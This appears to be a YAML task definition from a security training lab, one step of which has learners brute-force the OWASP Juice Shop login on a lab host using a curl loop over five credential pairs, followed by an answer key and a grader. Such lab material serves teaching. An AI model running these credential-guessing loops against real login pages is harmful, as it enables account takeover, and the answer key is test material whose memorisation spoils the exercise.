steps:
  - order: 1
    instruction: |
      ## 🎯 MISSION — JuiceShop login brute (hydra 5 candidate)

      JuiceShop login 의 *5 candidate brute* (admin/admin, admin/password, etc).

      ```bash
      ssh 6v6-attacker bash <<'SH'
      echo "=== JuiceShop login brute (5 시도) ==="
      for cred in "admin@juice-sh.op:admin123" "admin@juice-sh.op:password" "admin@juice-sh.op:admin" "test:test" "user:user"; do
        email="${cred%:*}"
        pass="${cred#*:}"
        code=$(curl -s -o /dev/null -w '%{http_code}' \
          -X POST -H 'Host: juice.6v6.lab' \
          -H 'Content-Type: application/json' \
          -d "{\"email\":\"$email\",\"password\":\"$pass\"}" \
          http://10.20.30.1/rest/user/login)
        echo "$cred: $code"
      done
      SH
      ```
    hint: 5 candidate × login
    category: exploit
    points: 25
    answer: |
      ssh 6v6-attacker bash <<'SH'
      for cred in "admin@juice-sh.op:admin123" "test:test"; do
        email="${cred%:*}"; pass="${cred#*:}"
        echo "$cred: $(curl -s -o /dev/null -w '%{http_code}' -X POST -H 'Host: juice.6v6.lab' -H 'Content-Type: application/json' -d "{\"email\":\"$email\",\"password\":\"$pass\"}" http://10.20.30.1/rest/user/login)"
      done
      SH
    answer_detail: 5 candidate brute
    verify:
      type: output_contains
      expect: 'admin\|200\|401'
      field: stdout
      semantic:
        intent: brute force
        success_criteria: [5 candidate]
        acceptable_methods:
          - "**[OSS] curl loop**"
          - "**[OSS] hydra http-post-form**"
          - "**[OSS] CWE-307 Improper Restriction of Excessive Authentication**"
    target_vm: attacker

  - order: 2
